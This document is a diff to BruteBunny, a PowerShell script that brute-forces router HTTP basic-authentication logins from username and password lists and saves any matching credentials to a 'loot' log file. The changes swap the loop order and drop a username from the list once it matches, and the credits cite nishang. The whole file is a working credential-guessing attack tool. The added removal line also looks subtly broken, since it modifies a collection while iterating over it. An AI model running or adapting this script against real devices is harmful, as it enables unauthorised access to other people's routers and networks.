@@ -1,10 +1,11 @@
 ﻿<#
 
 .SYNOPSIS
-BruteBunny 1.0
+BruteBunny 1.1
 
 .AUTHOR
 Decoy. Thanks to nishang for original script inspiration.
+RSXchin. Swapped order of username/password loop.
 
 .DESCRIPTION
 This script is designed to Brute Force common usernames/passwords for the router (http basic authentication)
@@ -26,11 +27,11 @@ $url = $Protocol + "://" + $Hostname + ":" + $Port + "/"
 $Usernames = Get-Content $UsernameList
 $Passwords = Get-Content $PasswordList
   
-# Does a depth first loop over usernames first, trying every password for each username sequentially in the list
-:UNLoop foreach ($Username in $Usernames)
+# Looping over passwords before usernames is more efficient
+:UNLoop foreach ($Password in $Passwords)
 {
-  # Loops through passwords in the list sequentially
-  foreach ($Password in $Passwords)
+  # Loops through users remaining in the list
+  foreach ($Username in $Usernames)
   {
     # Starts a new web client
     $WebClient = New-Object Net.WebClient
@@ -55,6 +56,8 @@ $Passwords = Get-Content $PasswordList
         $message = "[*] Match found! $Username : $Password" | Out-File -Append $Bunny\BruteBunny\loot\log.txt -width 250
         $message | Out-File -Append $Bunny\BruteBunny\loot\log.txt -width 250
         $content | Out-File -Append $Bunny\BruteBunny\loot\log.txt -width 250
+        # No need to try the same username with other passwords, so we remove it before the next loop.
+        $Usernames.Remove($Username)
         if ($StopOnSuccess)
         {
           break UNLoop
